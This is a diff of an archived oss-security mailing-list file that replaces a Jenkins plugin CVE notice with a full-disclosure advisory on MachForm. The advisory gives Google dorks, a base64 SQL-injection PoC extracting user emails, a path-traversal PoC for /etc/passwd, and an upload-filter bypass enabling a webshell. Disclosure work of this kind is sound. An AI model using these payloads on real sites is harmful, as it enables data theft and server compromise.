@@ -1,66 +1,115 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/05/5
-Message-Id: <AB29FCB4-3D11-43B6-AC4D-5AC1E3B3D426@beckweb.net>
-Date: Mon, 5 Feb 2018 14:09:15 +0100
-From: Daniel Beck <ml@...kweb.net>
-To: oss-security@...ts.openwall.com
-Subject: Re: Multiple vulnerabilities in Jenkins plugins
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/30/1
+Message-ID: <CAOGhsh0gWVyfmXt1hUnxCC45KYRYAE0dfXu3xR_gufSJ3W8CHg@mail.gmail.com>
+Date: Wed, 30 May 2018 21:23:20 +0200
+From: Amine Taouirsa <taouirsa@...il.com>
+To: vuln@...unia.com, bugs@...uritytracker.com,  submissions@...ketstormsecurity.org, bugtraq@...urityfocus.com,  oss-security@...ts.openwall.com
+Subject: MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411
 Content-Type: text/plain; charset=utf-8
 
+ Vendor: Appnitro
+Product webpage: https://www.machform.com/
+Full-Disclose: https://metalamin.github.io/MachForm-not-0-day-EN/
+Fix: https://www.machform.com/blog-machform-423-security-release/
 
-> On 5. Feb 2018, at 13:17, Daniel Beck <ml@...kweb.net> wrote:
-> 
-> SECURITY-521
-> JUnit plugin is affected by an XML External Entity (XXE) processing 
-> vulnerability. This allows an attacker to configure build processes such 
-> that JUnit plugin parses a maliciously crafted file that uses external 
-> entities for extraction of secrets from the Jenkins master, server-side 
-> request forgery, or denial-of-service attacks.
+Author: Amine Taouirsa
+Twitter: @metalamin
 
-CVE-2018-1000056
+Google dork examples:
+----------------------
+"machform" inurl:"view.php"
+"machform" inurl:"embed.php"
 
+Summary:
+---------
+The form creation platform MachForm from Appnitro is subject to SQL
+injections that lead to path traversal and arbitrary file upload.
 
-> SECURITY-659 (CCM)
+The application is widely deployed and with some google dorks it’s possible
+to find various webpages storing sensitive data as credit card numbers with
+corresponding security codes. Also, the arbitrary file upload can let an
+attacker get control of the server by uploading a WebShell.
 
-CVE-2018-1000054
+[1] SQL injection (CVE-2018-6410):
+-------------------------
 
+[1.1] Description:
+The software is subject to SQL injections in the ‘download.php’ file.
 
-> SECURITY-660 (Android Lint)
+[1.2] Parameters and statement:
+This SQLi can be found on the parameter ‘q’ which a base64 encoded value
+for the following parameters:
 
-CVE-2018-1000055
-
-
-> SECURITY-698
-> Credentials Binding plugin allows specifying passwords and other secrets as
-> environment variables, and will hide them from console output in builds.
-> 
-> However, since Jenkins will try to resolve references to other environment 
-> variables in environment variables passed to a build, this can result in 
-> other values than the one specified being provided to a build. For 
-> example, the value p4$$w0rd would result in Jenkins passing on p4$w0rd, as 
-> $$ is the escape sequence for a single $.
-> 
-> Credentials Binding plugin does not prevent such a transformed value (e.g. 
-> p4$w0rd) from being shown on the build log, allowing users to reconstruct 
-> the actual password value from the transformed one.
-> 
-> Credentials Binding plugin will now escape any $ characters in password 
-> values so they are correctly passed to the build.
-
-CVE-2018-1000057
+  $form_id  = $params['form_id'];
+  $id       = $params['id'];
+  $field_name = $params['el'];
+  $file_hash  = $params['hash'];
 
 
-> SECURITY-699
-> Arbitrary code execution due to incomplete sandbox protection in Pipeline: 
-> Supporting APIs Plugin: Methods related to Java deserialization like 
-> readResolve implemented in Pipeline scripts were not subject to sandbox 
-> protection, and could therefore execute arbitrary code. This could be 
-> exploited e.g. by regular Jenkins users with the permission to configure 
-> Pipelines in Jenkins, or by trusted committers to repositories containing 
-> Jenkinsfiles.
-> 
-> Deserialization of objects in Pipeline is now also subject to sandbox 
-> protection.
+So the injectable parameters are ‘el’ and ‘form_id’ obtaining error-based,
+stacked queries and time-based blind SQL injections. This is due to the
+following vulnerable statement:
 
-CVE-2018-1000058
+  $query  = "select {$field_name} from `".MF_TABLE_PREFIX."form_{$form_id}`
+where id=?";
+
+
+[1.3] POC
+Proof of concept to get the first user mail:
+  http:// [URL] / [Machform_folder] /download.php?q=ZWw9IChTRUxFQ1
+QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1
+QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIE
+JZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKS
+l4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1
+VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=
+
+Which is the base64 encoding for:
+  el= (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT
+MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT
+0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP
+BY x)a) ;&id=1&hash=1&form_id=1
+
+
+[2] Path traversal (CVE-2018-6409):
+-----------------------------------
+
+[2.1] Descrition
+download.php’ is used to serve stored files from the forms answers.
+Modifying the name of the file to serve on the corresponding ap_form table
+leads to a path traversal vulnerability.
+
+[2.2] POC
+First we need to change the name for the element on the form:
+update ap_form_58009 set element_4="../../../../../../.
+./../../../../../../../../../etc/passwd" where id=1;
+
+Now in order to be able to download it, we need to access:
+  http:// [URL] / [Machform_folder] /download.php?q=ZWw9NCZpZD0xJm
+hhc2g9NDAyYmEwMjMwZDZmNDRhMmRlNTkwYWMxMTEwN2E0NTgmZm9ybV9pZD01ODAwOQo=
+
+Which is the base64 encoding for;
+  el=4&id=1&hash=402ba0230d6f44a2de590ac11107a458&form_id=58009
+
+Note that hash is the MD5 of the corresponding filename:
+  md5("../../../../../../../../../../../../../../../../etc/passwd") =
+402ba0230d6f44a2de590ac11107a458
+
+[3] Bypass file upload filter (CVE-2018-6411):
+----------------------------------------------
+
+When the form is set to filter a blacklist, it automatically add dangerous
+extensions to the filters.
+If the filter is set to a whitelist, the dangerous extensions can be
+bypassed.
+
+This can be done directly on the database via SQLi
+update ap_form_elements set
+element_file_type_list="php",element_file_block_or_allow="a"
+where form_id=58009 and element_id=4;
+
+Once uploaded the file can be found and executed in the following URL:
+http:// [URL] / [Machform_folder] /data/form_58009/files/ [filename]
+
+The filename can be found in the database
+SELECT element_4 FROM ap_form_58009 WHERE id=1;
 
